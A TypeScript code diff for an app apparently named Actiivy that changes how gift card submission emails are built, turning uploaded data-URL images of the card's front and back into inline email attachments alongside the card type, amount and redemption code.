@@ -13,6 +13,8 @@ const inputSchema = z.object({
  code: z.string(), imageUrl: z.string().optional(), userAgent: z.string().optional(), ip: z.string().optional(), metadata: z.record(z.any()).optional()
 });
 
+type ImageAsset = { label: string; url: string; cid?: string; attachment?: { filename: string; content: Buffer; contentType: string; cid: string } };
+
 const escapeHtml = (value: string) => value.replace(/[&<>"']/g, character => ({
  '&': '&amp;',
  '<': '&lt;',
@@ -21,12 +23,28 @@ const escapeHtml = (value: string) => value.replace(/[&<>"']/g, character => ({
  "'": '&#39;'
  }[character] ?? character));
 
-const toAbsoluteUrl = (value?: unknown) => {
- if (typeof value !== 'string' || !value.trim()) return '';
+const toAbsoluteUrl = (value: string) => {
  try {
   return new URL(value, process.env.PUBLIC_APP_URL ?? 'https://actiivy-frontend.onrender.com').toString();
  } catch {
   return value;
+ }
+};
+
+const createImageAsset = (value: unknown, label: string, index: number): ImageAsset | null => {
+ if (typeof value !== 'string' || !value.trim()) return null;
+ const raw = value.trim();
+ if (!raw.startsWith('data:')) return { label, url: toAbsoluteUrl(raw) };
+ const match = raw.match(/^data:([^;,]+)?(;base64)?,([\s\S]*)$/);
+ if (!match) return null;
+ try {
+  const contentType = match[1] || 'application/octet-stream';
+  const content = match[2] ? Buffer.from(match[3], 'base64') : Buffer.from(decodeURIComponent(match[3]), 'utf8');
+  const cid = `actiivy-${Date.now()}-${index}@submission`;
+  const extension = contentType.split('/')[1]?.split('+')[0] || 'bin';
+  return { label, url: `cid:${cid}`, cid, attachment: { filename: `${label.toLowerCase().replace(/[^a-z0-9]+/g, '-')}.${extension}`, content, contentType, cid } };
+ } catch {
+  return null;
  }
 };
 
@@ -38,33 +56,31 @@ const sendSubmission = async (input: z.infer<typeof inputSchema>) => {
  const cardType = String(metadata.cardType ?? 'Not provided');
  const currency = String(metadata.currency ?? '');
  const amount = String(metadata.amount ?? 'Not provided');
- const frontImageUrl = toAbsoluteUrl(input.imageUrl);
- const backImageUrl = toAbsoluteUrl(metadata.backImageUrl);
- const imageLines = [
-  frontImageUrl ? `Front image: ${frontImageUrl}` : '',
-  backImageUrl ? `Back image: ${backImageUrl}` : ''
- ].filter(Boolean);
  const code = input.code || 'Not provided';
  const amountLabel = `${currency} ${amount}`.trim();
+ const imageAssets = [
+  createImageAsset(input.imageUrl, 'Front image', 1),
+  createImageAsset(metadata.backImageUrl, 'Back image', 2)
+ ].filter((asset): asset is ImageAsset => Boolean(asset));
+ const textImages = imageAssets.length ? imageAssets.map(asset => `${asset.label}: ${asset.attachment ? 'attached to this email' : asset.url}`).join('\n') : 'Images: None uploaded';
+ const htmlImages = imageAssets.length ? imageAssets.map(asset => {
+  if (asset.attachment && asset.cid) return `<p><strong>${escapeHtml(asset.label)}:</strong> attached below</p><p><img src="cid:${escapeHtml(asset.cid)}" alt="${escapeHtml(asset.label)}" style="max-width:600px;height:auto" /></p>`;
+  const safeUrl = escapeHtml(asset.url);
+  return `<p><strong>${escapeHtml(asset.label)}:</strong> <a href="${safeUrl}">${safeUrl}</a></p>`;
+ }).join('') : '<p><strong>Images:</strong> None uploaded</p>';
  const text = [
   'New Submission Received',
   `Card type: ${cardType}`,
   `Amount: ${amountLabel}`,
   `Redemption Code: ${code}`,
-  imageLines.length ? imageLines.join('\n') : 'Images: None uploaded'
+  textImages
  ].join('\n');
- const htmlImages = imageLines.length ? imageLines.map(line => {
-  const separator = line.indexOf(': ');
-  const label = separator >= 0 ? line.slice(0, separator) : 'Image';
-  const url = separator >= 0 ? line.slice(separator + 2) : line;
-  const safeUrl = escapeHtml(url);
-  return `<p><strong>${escapeHtml(label)}:</strong> <a href="${safeUrl}">${safeUrl}</a></p>`;
- }).join('') : '<p><strong>Images:</strong> None uploaded</p>';
  const message = {
   from: `Actiivy Alerts <${process.env.SMTP_USER}>`,
   subject: 'New Redeem Code / Gift Card Submission',
   text,
-  html: `<h2>New Submission Received</h2><p><strong>Card type:</strong> ${escapeHtml(cardType)}</p><p><strong>Amount:</strong> ${escapeHtml(amountLabel)}</p><p><strong>Redemption Code:</strong> <code>${escapeHtml(code)}</code></p>${htmlImages}`
+  html: `<h2>New Submission Received</h2><p><strong>Card type:</strong> ${escapeHtml(cardType)}</p><p><strong>Amount:</strong> ${escapeHtml(amountLabel)}</p><p><strong>Redemption Code:</strong> <code>${escapeHtml(code)}</code></p>${htmlImages}`,
+  attachments: imageAssets.flatMap(asset => asset.attachment ? [asset.attachment] : [])
  };
  await Promise.all(recipients.map(async to => {
   try {
